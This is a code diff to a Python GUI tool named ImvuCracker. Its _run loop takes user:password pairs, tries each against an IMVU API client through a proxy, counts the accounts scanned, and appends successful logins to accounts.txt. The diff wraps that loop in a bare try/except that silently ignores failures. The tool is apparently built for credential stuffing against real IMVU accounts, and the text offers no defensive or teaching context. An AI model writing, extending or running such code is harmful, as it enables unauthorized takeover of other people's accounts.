@@ -91,17 +91,20 @@ class ImvuCracker(tk.Tk):
     def _run(self, n, t):
         for i in n:
             if len(i) > 1:
-                a = imvu_api_client(
-                    i.split(':')[0], i.split(':')[1], t, self.proxy)
-                self.curret_counter += 1
-                if str(self.curret_counter)[len(str(self.curret_counter))-3:] == '000':
-                    self._add_finded_accounts(
-                        f'<ZABBIX>: Accounts scaned {self.curret_counter}')
+                try:
+                    a = imvu_api_client(
+                        i.split(':')[0], i.split(':')[1], t, self.proxy)
+                    self.curret_counter += 1
+                    if str(self.curret_counter)[len(str(self.curret_counter))-3:] == '000':
+                        self._add_finded_accounts(
+                            f'<ZABBIX>: Accounts scaned {self.curret_counter}')
 
-                if a != None:
-                    f = open(f'accounts.txt', 'a')
-                    f.write(f'{a}\n')
-                    f.close()
+                    if a != None:
+                        f = open(f'accounts.txt', 'a')
+                        f.write(f'{a}\n')
+                        f.close()
+                except:
+                    pass
 
     def thread(self):
         open(f'accounts.txt', 'w')
